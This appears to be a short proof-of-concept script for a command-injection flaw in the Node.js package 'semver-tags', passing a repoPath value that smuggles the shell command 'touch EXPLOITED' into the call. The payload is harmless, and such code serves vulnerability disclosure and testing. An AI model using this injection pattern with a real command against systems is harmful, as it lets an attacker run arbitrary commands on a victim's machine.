var r = require("semver-tags")
opt = {"repoType":"git","repoPath":"\";touch EXPLOITED;\""}
finalCb = console.log
r(opt,finalCb)
